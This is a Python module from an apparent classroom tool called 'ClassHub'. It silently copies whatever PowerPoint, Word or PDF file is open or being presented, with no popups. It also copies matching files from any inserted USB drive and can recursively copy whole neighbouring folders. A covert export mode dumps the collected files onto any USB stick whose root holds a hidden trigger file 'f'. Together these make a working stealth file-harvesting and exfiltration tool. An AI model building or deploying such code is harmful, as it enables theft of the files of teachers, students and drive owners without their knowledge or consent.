# -*- coding: utf-8 -*-
"""
================================================================================
 ClassHub · chub_sync —— 课件同步引擎
================================================================================
把正在放映 / 打开的课件（PPT / Word / PDF）静默复制到目标文件夹，
U 盘模式下插上 U 盘自动把里面的课件拷走。全程不弹窗、不打断放映。

判断"该抓哪个文件"的三层兜底：
    1. COM 接口（主）：问 PowerPoint / WPS 放映窗口对应的文件完整路径（只读，不干扰放映）
    2. 放映窗口（备）：检测 screenClass 这类全屏放映窗口是否存在
    3. 进程句柄（再备）：从 POWERPNT.EXE / wpp.exe 打开的文件句柄里找

只在本机复制文件，没有任何联网、上传、外发行为。
"""

from __future__ import annotations

import os
import shutil
import time
import urllib.parse

import chub_core as core
from chub_core import CFG, COPIED_PATH, HAVE_PSUTIL, HAVE_WIN32, log

if HAVE_WIN32:
    win32com = core.win32com
    win32gui = core.win32gui
if HAVE_PSUTIL:
    psutil = core.psutil

# ---------------------------------------------------------------- 常量
PPT_EXT = {".ppt", ".pptx", ".pps", ".ppsx", ".pptm", ".ppsm", ".pot", ".potx"}
DOC_EXT = {".doc", ".docx", ".docm", ".dot", ".dotx", ".rtf", ".odt", ".wps", ".txt"}
PDF_EXT = {".pdf"}
PLAYER_PROCESSES = {"POWERPNT.EXE", "WPP.EXE", "WPS.EXE"}
WORD_PROCESSES = {"WINWORD.EXE", "WPS.EXE"}
PDF_PROCESSES = {
    "ACRORD32.EXE", "ACROBAT.EXE", "FOXITREADER.EXE", "FOXITPDFREADER.EXE",
    "SUMATRAMIXED.EXE", "SUMATRA.EXE", "SUMATRAPDF.EXE",
    "WPSPDF.EXE", "PDFREADER.EXE",
    "MSEDGE.EXE", "CHROME.EXE", "FIREFOX.EXE", "360CHROME.EXE", "QQBROWSER.EXE",
}
SLIDESHOW_CLASS_HINTS = ("screenclass", "slideshow", "screen")
COM_PPT_IDS = ("PowerPoint.Application", "KWPP.Application", "WPP.Application")
COM_WORD_IDS = ("Word.Application", "KWps.Application", "KWPS.Application")

KIND_NAMES = {"ppt": "演示文稿", "doc": "文档", "pdf": "PDF"}

# U 盘模式：只拷这三类（刻意不含 .txt，U 盘根目录常有 readme/日志）
USB_EXT = PPT_EXT | (DOC_EXT - {".txt"}) | PDF_EXT
USB_SKIP_DIRS = {
    "system volume information", "$recycle.bin", "recycler",
    ".trashes", ".spotlight-v100", "found.000", "recovery",
    "windows", "program files", "program files (x86)", "programdata",
    "$windows.~ws", "$windows.~bt", "windows.old", "msocache",
    "appdata", "node_modules", ".git", "__pycache__",
}

USB_SCANNED: dict = {}
USB_EXPORT_SCANNED: dict = {}    # U 盘导出：每个盘上次检查的时间


# ---------------------------------------------------------------- 工具
def dest_root() -> str:
    return CFG.get("sync.dest") or core.default_dest()


def kind_of(path: str) -> str:
    ext = os.path.splitext(path)[1].lower()
    if ext in PPT_EXT:
        return "ppt"
    if ext in PDF_EXT:
        return "pdf"
    return "doc"


def is_junk_path(path: str) -> bool:
    """过滤临时目录 / 浏览器缓存 / Office 缓存，但放行微信 QQ 收到的文件"""
    low = path.lower().replace("/", "\\")
    junk_marks = (
        "\\$recycle.bin\\", "\\windows\\temp\\", "\\temp\\",
        "\\appdata\\local\\temp\\", "\\inetcache\\",
        "\\cache\\", "\\code cache\\", "\\service worker\\",
        "\\cachestorage\\", "\\content.mso\\", "\\content.ie5\\",
    )
    for mark in junk_marks:
        if mark in low:
            if any(k in low for k in ("filestorage", "tencent files",
                                      "wechat files", "xwechat_files")):
                continue
            return True
    return False


def decode_file_arg(arg: str) -> str:
    """把 file:///D:/xxx.pdf 还原成本地路径"""
    if arg.lower().startswith("file:///"):
        arg = urllib.parse.unquote(arg[8:]).replace("/", os.sep)
    return arg


def norm_paths(paths, exts) -> list:
    """去重 + 过滤，返回 [(绝对路径, 类型)]"""
    result, seen = [], set()
    for raw in paths:
        if not raw:
            continue
        p = decode_file_arg(raw)
        try:
            p = os.path.abspath(p)
        except Exception:
            continue
        base = os.path.basename(p)
        if base.startswith("~$") or base.startswith("."):
            continue
        if os.path.splitext(base)[1].lower() not in exts:
            continue
        if is_junk_path(p) or not os.path.isfile(p):
            continue
        k = core.file_key(p)
        if k in seen:
            continue
        seen.add(k)
        result.append((p, kind_of(p)))
    return result


# ---------------------------------------------------------------- COM 检测
def com_ppt_files(mode: str = "slideshow") -> list:
    out: list = []
    if not HAVE_WIN32:
        return out
    for prog_id in COM_PPT_IDS:
        try:
            app = win32com.client.GetActiveObject(prog_id)
        except Exception:
            continue
        try:
            count = int(app.SlideShowWindows.Count)
        except Exception:
            count = 0
        for i in range(1, count + 1):
            try:
                p = str(app.SlideShowWindows.Item(i).Presentation.FullName)
                if p:
                    out.append(p)
            except Exception:
                continue
        try:
            total = int(app.Presentations.Count)
        except Exception:
            total = 0
        for i in range(1, total + 1):
            try:
                pres = app.Presentations.Item(i)
                if mode == "slideshow":
                    try:
                        pres.SlideShowWindow      # 没在放映会抛异常
                    except Exception:
                        continue
                p = str(pres.FullName)
                if p:
                    out.append(p)
            except Exception:
                continue
        if out:
            break
    return out


def com_word_files() -> list:
    out: list = []
    if not HAVE_WIN32:
        return out
    for prog_id in COM_WORD_IDS:
        try:
            app = win32com.client.GetActiveObject(prog_id)
        except Exception:
            continue
        try:
            total = int(app.Documents.Count)
        except Exception:
            total = 0
        for i in range(1, total + 1):
            try:
                p = str(app.Documents.Item(i).FullName)
                if p:
                    out.append(p)
            except Exception:
                continue
        if out:
            break
    return out


def slideshow_window_exists() -> bool:
    """窗口层面兜底：是否存在全屏放映窗口"""
    if not HAVE_WIN32:
        return False
    try:
        if win32gui.FindWindow("screenClass", None):
            return True
    except Exception:
        pass
    found = False
    try:
        sw = win32gui.GetSystemMetrics(0)
        sh = win32gui.GetSystemMetrics(1)
    except Exception:
        sw = sh = 0

    def _cb(hwnd, _):
        nonlocal found
        if found:
            return
        try:
            if not win32gui.IsWindowVisible(hwnd):
                return
            cls = (win32gui.GetClassName(hwnd) or "").lower()
            title = win32gui.GetWindowText(hwnd) or ""
            left, top, right, bottom = win32gui.GetWindowRect(hwnd)
        except Exception:
            return
        if sw and sh and ((right - left) < sw * 0.9 or (bottom - top) < sh * 0.9):
            return
        if any(h in cls for h in SLIDESHOW_CLASS_HINTS):
            found = True
        elif "放映" in title or "slideshow" in title.lower():
            found = True

    try:
        win32gui.EnumWindows(_cb, None)
    except Exception:
        pass
    return found


def files_from_processes(names, exts) -> list:
    """从进程的打开文件句柄和命令行参数里找目标文件"""
    out: list = []
    if not HAVE_PSUTIL:
        return out
    try:
        for proc in psutil.process_iter(["name"]):
            name = (proc.info.get("name") or "").upper()
            if names is not None and name not in names:
                continue
            try:
                for f in proc.open_files():
                    if os.path.splitext(f.path)[1].lower() in exts:
                        out.append(f.path)
            except Exception:
                pass
            try:
                for arg in proc.cmdline():
                    if len(arg) < 6 or (":" not in arg and "\\" not in arg and "/" not in arg):
                        continue
                    if os.path.splitext(decode_file_arg(arg))[1].lower() in exts:
                        out.append(arg)
            except Exception:
                pass
    except Exception:
        pass
    return out


def detect_ppt() -> list:
    mode = CFG.get("sync.ppt_mode", "slideshow")
    paths = com_ppt_files(mode)
    if not paths:
        if mode == "slideshow":
            if slideshow_window_exists():
                paths = files_from_processes(PLAYER_PROCESSES, PPT_EXT)
        else:
            paths = files_from_processes(PLAYER_PROCESSES, PPT_EXT)
    return norm_paths(paths, PPT_EXT)


def detect_doc() -> list:
    paths = com_word_files()
    if not paths:
        paths = files_from_processes(WORD_PROCESSES, DOC_EXT)
    return norm_paths(paths, DOC_EXT)


def detect_pdf() -> list:
    paths = files_from_processes(PDF_PROCESSES, PDF_EXT)
    if not paths and CFG.get("sync.deep_scan", False):
        paths = files_from_processes(None, PDF_EXT)
    return norm_paths(paths, PDF_EXT)


def detect_files() -> list:
    """按设置返回当前该抓的文件 [(路径, 类型)]"""
    result: list = []
    if CFG.get("sync.enable_ppt", False):
        result += detect_ppt()
    if CFG.get("sync.enable_doc", False):
        result += detect_doc()
    if CFG.get("sync.enable_pdf", False):
        result += detect_pdf()
    seen, uniq = set(), []
    for p, k in result:
        key = core.file_key(p)
        if key in seen:
            continue
        seen.add(key)
        uniq.append((p, k))
    return uniq


# ---------------------------------------------------------------- U 盘模式
def _kernel32():
    if not core.IS_WINDOWS:
        return None
    try:
        import ctypes
        return ctypes.windll.kernel32
    except Exception:
        return None


def list_removable_drives() -> list:
    """列出当前插着的 U 盘 / 移动硬盘盘符"""
    drives: list = []
    k32 = _kernel32()
    candidates: list = []
    if HAVE_PSUTIL:
        try:
            for part in psutil.disk_partitions(all=False):
                m = (part.mountpoint or "").rstrip("\\")
                if len(m) == 2 and m[1] == ":":
                    candidates.append(m + "\\")
        except Exception:
            pass
    if not candidates:
        candidates = ["%s:\\" % c for c in "DEFGHIJKLMNOPQRSTUVWXYZ"]
    for d in candidates:
        try:
            if not os.path.isdir(d):
                continue
        except Exception:
            continue
        if k32 is not None:
            try:
                if k32.GetDriveTypeW(d) != 2:      # 2 = DRIVE_REMOVABLE
                    continue
            except Exception:
                continue
        drives.append(d)
    return drives


def drive_label(drive: str) -> str:
    k32 = _kernel32()
    if k32 is not None:
        try:
            import ctypes
            buf = ctypes.create_unicode_buffer(261)
            if k32.GetVolumeInformationW(drive, buf, 261, None, None, None, None, 0):
                label = (buf.value or "").strip()
                if label:
                    return core.safe_name(label)
        except Exception:
            pass
    return core.safe_name(drive.rstrip("\\").replace(":", "") or "U盘")


def usb_target_dir(drive: str, src: str = "") -> str:
    dest = dest_root()
    mode = CFG.get("sync.usb_subfolder", "label")
    if mode in ("label", "tree"):
        dest = os.path.join(dest, core.safe_name(drive_label(drive)))
    if mode == "tree" and src:
        try:
            rel = os.path.relpath(os.path.dirname(os.path.abspath(src)),
                                  os.path.abspath(drive))
        except Exception:
            rel = ""
        if rel and rel not in (".", ""):
            dest = os.path.join(dest, *[core.safe_name(x) for x in rel.split(os.sep)])
    return dest


def scan_drive_files(drive: str) -> list:
    max_files = int(CFG.get("sync.usb_max_files", 3000) or 3000)
    max_depth = int(CFG.get("sync.usb_max_depth", 8) or 8)
    max_bytes = float(CFG.get("sync.usb_max_size_mb", 200) or 200) * 1024 * 1024
    dest_root_lc = os.path.normcase(os.path.abspath(dest_root()))
    found: list = []

    def walk(folder: str, depth: int):
        if len(found) >= max_files or depth > max_depth:
            return
        try:
            entries = list(os.scandir(folder))
        except Exception:
            return
        for ent in entries:
            if len(found) >= max_files:
                return
            try:
                if ent.name.startswith("~$") or ent.name.startswith("."):
                    continue
                if ent.is_dir(follow_symlinks=False):
                    if ent.name.lower() in USB_SKIP_DIRS:
                        continue
                    try:
                        if os.path.normcase(os.path.abspath(ent.path)).startswith(dest_root_lc):
                            continue        # 别把目标文件夹自己又扫进来
                    except Exception:
                        pass
                    walk(ent.path, depth + 1)
                elif ent.is_file(follow_symlinks=False):
                    if os.path.splitext(ent.name)[1].lower() not in USB_EXT:
                        continue
                    try:
                        if max_bytes > 0 and ent.stat().st_size > max_bytes:
                            continue
                    except Exception:
                        continue
                    found.append(ent.path)
            except Exception:
                continue

    walk(drive, 0)
    return found


# ================================================================ U 盘导出
# 反向功能：U 盘根目录放一个隐藏文件（默认叫 f，内容 1），
# 插上来就把课件文件夹里的东西拷进这个 U 盘。方便把攒了一学期的课件一次带走。
#
# 跟上面的"U 盘模式"是两回事：那边是 U 盘 → 电脑，这边是 电脑 → U 盘。

EXPORTED_DRIVES: dict = {}      # drive -> 触发值（这盘这次已经导过了）
_EXPORT_NOTES: dict = {}        # drive -> 上次提示，避免每次扫描都刷日志


def is_hidden(path: str) -> bool:
    """Windows 的隐藏属性（FILE_ATTRIBUTE_HIDDEN）"""
    if not core.IS_WINDOWS:
        return False
    k32 = _kernel32()
    if k32 is None:
        return False
    try:
        import ctypes

        return bool(k32.GetFileAttributesW(path) & 0x2)
    except Exception:
        return False


def read_usb_trigger(drive: str) -> tuple:
    """读 U 盘根目录里的触发文件。返回 (是否命中, 内容, 说明)

    命中条件：文件存在 →（可选）是隐藏文件 → 内容非空且不等于禁用值
             →（若设了 trigger_value）内容等于它
    """
    name = str(CFG.get("usb_export.trigger_file") or "f").strip() or "f"
    path = os.path.join(drive, name)
    if not os.path.isfile(path):
        return False, "", "没有 %s" % name
    if bool(CFG.get("usb_export.require_hidden", True)) and not is_hidden(path):
        return False, "", "找到 %s，但它不是隐藏文件（命令行执行 attrib +h %s）" % (name, path)
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            raw = f.read()
    except Exception as e:
        return False, "", "读取 %s 失败：%s" % (name, e)

    value = ""
    for line in raw.splitlines():          # 取第一个非空行，容忍末尾换行和 BOM
        line = line.strip().lstrip("\ufeff").strip()
        if line:
            value = line
            break
    if not value:
        return False, "", "%s 是空文件" % name
    if value.lower() in ("0", "off", "no", "false", "disable", "关", "关闭", "否"):
        return False, value, "内容是禁用值 %r" % value
    want = str(CFG.get("usb_export.trigger_value") or "").strip()
    if want and value != want:
        return False, value, "内容 %r 不等于设定的 %r" % (value, want)
    return True, value, "ok"


def list_dest_files() -> list:
    """列出课件文件夹里的全部文件（递归，保留相对路径）"""
    root = dest_root()
    if not os.path.isdir(root):
        return []
    max_files = int(float(CFG.get("usb_export.max_files", 5000) or 5000))
    max_bytes = float(CFG.get("usb_export.max_size_mb", 500) or 0) * 1024 * 1024
    max_total = float(CFG.get("usb_export.max_total_mb", 0) or 0) * 1024 * 1024
    out: list = []
    total = 0
    root_abs = os.path.abspath(root)
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames
                       if d.lower() not in USB_SKIP_DIRS and not d.startswith(".")]
        for fn in filenames:
            if len(out) >= max_files:
                return out
            if fn.startswith("~$") or fn.startswith("."):
                continue
            p = os.path.join(dirpath, fn)
            try:
                if not os.path.isfile(p):
                    continue
                size = os.path.getsize(p)
            except Exception:
                continue
            if max_bytes > 0 and size > max_bytes:
                continue
            if max_total > 0 and total + size > max_total:
                continue
            try:
                rel = os.path.relpath(p, root_abs)
            except Exception:
                rel = fn
            total += size
            out.append((p, rel))
    return out


def export_to_usb(drive: str) -> tuple:
    """把课件文件夹拷到 U 盘。返回 (拷了几个, 目标目录, 说明)"""
    root = dest_root()
    if not os.path.isdir(root):
        return 0, "", "课件文件夹不存在：%s" % root

    # 别自己拷自己：课件文件夹就在这个 U 盘里面
    # （不能只比盘符首字母 —— 那样在 Linux/网络路径下会误判；直接判断包含关系）
    root_abs = os.path.normcase(os.path.abspath(root))
    drive_abs = os.path.normcase(os.path.abspath(drive))
    if root_abs == drive_abs or root_abs.startswith(drive_abs.rstrip(os.sep) + os.sep):
        return 0, "", "课件文件夹就在这个盘上（%s），跳过，避免自己拷自己" % root

    sub = str(CFG.get("usb_export.dest_subfolder") or "").strip()
    target = os.path.join(drive, core.safe_name(sub)) if sub else drive
    try:
        os.makedirs(target, exist_ok=True)
    except Exception as e:
        return 0, "", "在 U 盘上建目录失败：%s" % e
    # 反过来：U 盘的目标目录落在课件文件夹里，也会自己拷自己
    target_abs = os.path.normcase(os.path.abspath(target))
    if target_abs == root_abs or target_abs.startswith(root_abs.rstrip(os.sep) + os.sep):
        return 0, "", "导出目录落在课件文件夹里（%s），跳过，避免自己拷自己" % target

    files = list_dest_files()
    if not files:
        return 0, target, "课件文件夹是空的"

    overwrite = bool(CFG.get("usb_export.overwrite", False))
    got, skipped, failed = 0, 0, 0
    for src, rel in files:
        dest = os.path.join(target, *[core.safe_name(x)
                                      for x in rel.split(os.sep) if x not in ("", ".", "..")])
        try:
            os.makedirs(os.path.dirname(dest), exist_ok=True)
        except Exception:
            failed += 1
            continue
        try:
            if os.path.exists(dest):
                if overwrite:
                    pass
                elif os.path.getsize(dest) == os.path.getsize(src):
                    skipped += 1
                    continue        # U 盘上已经有同样大小的，不重复拷
                else:
                    dest = unique_path(dest)
            shutil.copy2(src, dest)
            got += 1
        except Exception as e:
            failed += 1
            log("导出失败：%s （%s）" % (src, e))
    return got, target, "新增 %d，已有 %d 跳过，失败 %d" % (got, skipped, failed)


def _note_once(drive: str, note: str):
    """同一条提示对同一个盘只记一次，别每 10 秒刷一行"""
    if not note or note == "ok":
        return
    # 没带触发文件的盘：默认只在第一次看到时记一行（方便确认"扫到了"），
    # 不想看就勾上 no_trigger_file_no_log
    if CFG.get("usb_export.no_trigger_file_no_log", False) and note.startswith("没有 "):
        return
    if _EXPORT_NOTES.get(drive) == note:
        return
    _EXPORT_NOTES[drive] = note
    log("U 盘 %s：%s" % (drive, note))


def check_usb_export(force: bool = False) -> tuple:
    """看一圈插着的 U 盘有没有带触发文件的。返回 (导出了几个, 目标目录, 说明)"""
    if not CFG.get("usb_export.enable", False):
        return 0, "", ""

    interval = max(3.0, float(CFG.get("usb_export.interval", 10) or 10))
    now = time.time()
    drives = list_removable_drives()

    # 盘拔了就把"已导出"记录忘掉，下次再插会重新导
    for d in list(EXPORTED_DRIVES):
        if d not in drives:
            EXPORTED_DRIVES.pop(d, None)
            _EXPORT_NOTES.pop(d, None)

    for drive in drives:
        last = USB_EXPORT_SCANNED.get(drive, 0)
        if not force and (now - last) < interval:
            continue
        USB_EXPORT_SCANNED[drive] = now

        hit, value, note = read_usb_trigger(drive)
        if not hit:
            _note_once(drive, note)
            continue
        if not force and CFG.get("usb_export.once_per_insert", True) \
                and EXPORTED_DRIVES.get(drive) == value:
            continue

        cnt, target, msg = export_to_usb(drive)
        EXPORTED_DRIVES[drive] = value
        _EXPORT_NOTES.pop(drive, None)
        if cnt or "失败" in msg or "空" in msg:
            log("U 盘 %s（%s）触发导出：内容 %r → %s，%s"
                % (drive, drive_label(drive), value, target, msg))
        else:
            log("U 盘 %s 触发导出，但没拷任何文件：%s" % (drive, msg))
        return cnt, target, msg
    return 0, "", ""


def scan_usb_once(force: bool = False) -> list:
    """扫一次所有插着的 U 盘，返回本次新复制到的目标路径"""
    interval = max(10.0, float(CFG.get("sync.usb_interval", 60) or 60))
    now = time.time()
    copied = core.load_json_dict(COPIED_PATH)
    new_files: list = []

    for drive in list_removable_drives():
        last = USB_SCANNED.get(drive, 0)
        if not force and (now - last) < interval:
            continue
        USB_SCANNED[drive] = now
        try:
            paths = scan_drive_files(drive)
        except Exception as e:
            log("U 盘 %s 扫描失败：%s" % (drive, e))
            continue
        if not paths:
            continue
        got = 0
        for src in paths:
            key = core.file_key(src)
            sig = core.file_sig(src)
            if copied.get(key) == sig:
                continue
            ok, dest, status = copy_one(src, kind_of(src),
                                        usb_target_dir(drive, src),
                                        allow_size_skip=False)
            if ok:
                copied[key] = sig
                got += 1
                new_files.append(dest)
            elif status.startswith("error"):
                log("U 盘文件失败：%s （%s）" % (src, status))
        if got:
            core.save_json_dict(COPIED_PATH, copied)
            log("U 盘 %s（%s）新增 %d 个文件" % (drive, drive_label(drive), got))
    return new_files


# ---------------------------------------------------------------- 复制
def unique_path(path: str) -> str:
    if not os.path.exists(path):
        return path
    stem, ext = os.path.splitext(path)
    i = 2
    while os.path.exists("%s (%d)%s" % (stem, i, ext)):
        i += 1
    return "%s (%d)%s" % (stem, i, ext)


def find_same_sig(src: str, dest: str) -> str:
    """在 dest / dest (2) / dest (3)… 这一系列里，找有没有跟 src 一模一样的那份。

    找到就说明这份内容已经拷过了，不该再拷一份新的 (N)。
    只在"目标已存在"时才需要它——否则 unique_path 只会挑一个空位，
    结果同一份文件被反复拷成 (2) (3) (4) 一堆。
    """
    if not os.path.exists(dest):
        return ""
    try:
        sig = core.file_sig(src)
    except Exception:
        return ""
    try:
        if core.file_sig(dest) == sig:
            return dest
    except Exception:
        pass
    stem, ext = os.path.splitext(dest)
    i = 2
    while i < 500:
        cand = "%s (%d)%s" % (stem, i, ext)
        if not os.path.exists(cand):
            break
        try:
            if core.file_sig(cand) == sig:
                return cand
        except Exception:
            pass
        i += 1
    return ""


def target_dir_for(src: str, kind: str = "ppt") -> str:
    dest = dest_root()
    mode = CFG.get("sync.subfolder_mode", "none")
    if mode == "date":
        import datetime as _dt
        dest = os.path.join(dest, _dt.datetime.now().strftime("%Y-%m-%d"))
    elif mode == "source":
        parent = os.path.basename(os.path.dirname(src)) or "课件"
        dest = os.path.join(dest, core.safe_name(parent))
    elif mode == "type":
        dest = os.path.join(dest, KIND_NAMES.get(kind, "其他"))
    return dest


def copy_one(src: str, kind: str = "ppt", dest_dir: str = "",
             allow_size_skip: bool = True) -> tuple:
    """返回 (是否新复制, 目标路径, 状态说明)

    同名处理（exists_policy）：
        rename        目标已存在、且内容指纹不同 → 另存为「xxx (2)」；
                      指纹相同（真的同一份）→ 跳过，不产生垃圾副本
        rename_always 只要同名就另存，不做任何比较
        overwrite     直接覆盖
        skip          有同名就跳过

    注意：以前只比文件大小，老师改了几页字、大小恰好没变时会被误判成"同一份"
    而跳过，所以 rename 看起来"用不了"。现在比 大小+修改时间 的指纹。
    """
    try:
        min_kb = float(CFG.get("sync.min_size_kb", 0) or 0)
        if min_kb > 0 and os.path.getsize(src) < min_kb * 1024:
            return False, "", "skip:too-small"
    except Exception:
        pass

    dest_dir = dest_dir or target_dir_for(src, kind)
    try:
        os.makedirs(dest_dir, exist_ok=True)
    except Exception as e:
        return False, "", "error:makedirs %s" % e

    dest = os.path.join(dest_dir, core.safe_name(os.path.basename(src)))
    if core.file_key(src) == core.file_key(dest):
        return False, "", "skip:is-target"

    if os.path.exists(dest):
        policy = CFG.get("sync.exists_policy", "rename")
        if policy == "overwrite":
            pass
        elif policy == "skip":
            return False, dest, "skip:exists"
        elif policy == "rename_always":
            dest = unique_path(dest)
        else:
            # rename：先看 xxx / xxx (2) / xxx (3)… 里有没有一模一样的那份，
            # 有就跳过；没有（说明老师更新了课件）才另存一份新的
            if allow_size_skip and CFG.get("sync.skip_if_exists", True):
                found = find_same_sig(src, dest)
                if found:
                    return False, found, "skip:exists"
            dest = unique_path(dest)

    try:
        shutil.copy2(src, dest)
    except Exception as e:
        return False, "", "error:copy %s" % e
    return True, dest, "ok"


# ---------------------------------------------------------------- 顺便拷同目录
def siblings_dir_for(src: str, kind: str = "ppt") -> str:
    """同目录文件放到哪：默认「目标目录/源文件夹名/」，避免跟别处的文件撞名"""
    base = target_dir_for(src, kind)
    if not CFG.get("sync.siblings_use_subfolder", True):
        return base
    folder = os.path.basename(os.path.dirname(src)) or "课件"
    return os.path.join(base, core.safe_name(folder))


def _sibling_ok(path: str, max_mb: float) -> bool:
    """同目录文件要不要拷：过滤垃圾路径、超大文件、隐藏文件"""
    if not os.path.isfile(path):
        return False
    name = os.path.basename(path)
    if name.startswith("~$") or name.startswith("."):
        return False
    if is_junk_path(path):
        return False
    if max_mb > 0:
        try:
            if os.path.getsize(path) > max_mb * 1024 * 1024:
                return False
        except Exception:
            return False
    return True


def copy_siblings(src: str, kind: str = "ppt", copied: dict | None = None) -> list:
    """把 src 所在目录里的其他文件也拷走。返回实际拷到的目标路径列表

    两个级别（设置里两个开关）：
        copy_siblings            只拷这一层的直接子文件，不进子文件夹
        copy_siblings_recursive  连子文件夹一起递归拷，保留目录结构
    """
    if not CFG.get("sync.copy_siblings", False):
        return []

    src_dir = os.path.dirname(os.path.abspath(src))
    if not os.path.isdir(src_dir):
        return []
    recursive = bool(CFG.get("sync.copy_siblings_recursive", False))
    max_files = int(float(CFG.get("sync.siblings_max_files", 200) or 200))
    max_mb = float(CFG.get("sync.siblings_max_size_mb", 200) or 0)
    use_sub = bool(CFG.get("sync.siblings_use_subfolder", True))

    dest_base = siblings_dir_for(src, kind)
    src_key = core.file_key(src)
    # copied 由调用方传入并就地更新，避免两边各存一份互相覆盖
    if copied is None:
        copied = core.load_json_dict(COPIED_PATH)
        own = True
    else:
        own = False
    got: list = []

    def do_copy(path: str, rel: str):
        if len(got) >= max_files:
            return
        if not _sibling_ok(path, max_mb):
            return
        if core.file_key(path) == src_key:
            return                      # 主文件自己已经拷过了
        sub = os.path.join(dest_base, rel) if use_sub else dest_base
        try:
            os.makedirs(sub, exist_ok=True)
        except Exception:
            return
        dest = os.path.join(sub, core.safe_name(os.path.basename(path)))
        try:
            if core.file_key(os.path.abspath(dest)) == core.file_key(path):
                return                  # 目标就在源目录里，别自己拷自己
        except Exception:
            pass
        # 同目录文件按指纹去重，重复扫描不会一遍遍拷
        key = core.file_key(path)
        sig = core.file_sig(path)
        if copied.get(key) == sig:
            return
        if os.path.exists(dest):
            policy = CFG.get("sync.exists_policy", "rename")
            if policy == "skip":
                return
            if policy != "overwrite":
                if CFG.get("sync.skip_if_exists", True) and find_same_sig(path, dest):
                    copied[key] = sig
                    return
                dest = unique_path(dest)
        try:
            shutil.copy2(path, dest)
        except Exception as e:
            log("同目录文件失败：%s （%s）" % (path, e))
            return
        copied[key] = sig
        got.append(dest)

    if recursive:
        depth = int(float(CFG.get("sync.usb_max_depth", 8) or 8))
        base_len = len(src_dir.rstrip(os.sep))

        def walk(folder: str, d: int):
            if d > depth or len(got) >= max_files:
                return
            try:
                entries = list(os.scandir(folder))
            except Exception:
                return
            for e in entries:
                if len(got) >= max_files:
                    return
                try:
                    if e.is_dir(follow_symlinks=False):
                        if e.name.lower() in USB_SKIP_DIRS:
                            continue
                        walk(e.path, d + 1)
                    elif e.is_file(follow_symlinks=False):
                        rel = os.path.dirname(e.path)[base_len:].lstrip(os.sep)
                        do_copy(e.path, rel)
                except Exception:
                    continue

        walk(src_dir, 0)
    else:
        try:
            for e in os.scandir(src_dir):
                if len(got) >= max_files:
                    break
                if e.is_file(follow_symlinks=False):
                    do_copy(e.path, "")
        except Exception:
            pass

    if got:
        if own:
            core.save_json_dict(COPIED_PATH, copied)
        log("同目录拷贝：%s  ->  %s（%d 个文件%s）"
            % (src_dir, dest_base, len(got), "，含子文件夹" if recursive else ""))
    return got


def scan_once(force: bool = False) -> list:
    """执行一次检测，返回本次新复制到的目标路径"""
    if not CFG.get("sync.enable", False):
        return []
    copied = core.load_json_dict(COPIED_PATH)
    new_files: list = []
    for src, kind in detect_files():
        key = core.file_key(src)
        sig = core.file_sig(src)
        if not force and copied.get(key) == sig:
            continue
        ok, dest, status = copy_one(src, kind)
        if ok:
            copied[key] = sig
            core.save_json_dict(COPIED_PATH, copied)
            new_files.append(dest)
            log("已复制[%s]：%s  ->  %s" % (KIND_NAMES.get(kind, kind), src, dest))
            new_files += copy_siblings(src, kind, copied)
        elif status.startswith("error"):
            log("失败：%s （%s）" % (src, status))
        elif status == "skip:exists":
            copied[key] = sig
            core.save_json_dict(COPIED_PATH, copied)
            if CFG.get("sync.log_duplicate_skip", False):
                log("跳过（已存在）：%s" % src)
    return new_files


def clear_records():
    core.save_json_dict(COPIED_PATH, {})
    log("已清空复制记录，下次检测将重新复制")
